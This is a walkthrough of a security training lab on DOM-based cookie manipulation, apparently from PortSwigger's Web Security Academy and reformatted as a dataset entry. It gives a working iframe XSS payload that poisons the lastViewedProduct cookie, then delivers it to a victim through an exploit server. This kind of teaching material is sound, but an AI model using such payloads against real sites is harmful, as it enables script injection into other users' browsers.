## DOM-based cookie manipulation

**Category:** xss_dom
**Difficulty:** Unknown

### Description
This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call theprint()function. You will need to use the exploit server to direct the victim to the correct pages.

### Solution Steps
1. Notice that the home page uses a client-side cookie called lastViewedProduct , whose value is the URL of the last product page that the user visited.
2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
3. Store the exploit and deliver it to the victim.

### Key Payloads
- `print()`
- `lastViewedProduct`
- `iframe`
- `YOUR-LAB-ID`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`
- `onload`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_dom

---
*Source: PortSwigger Web Security Academy*
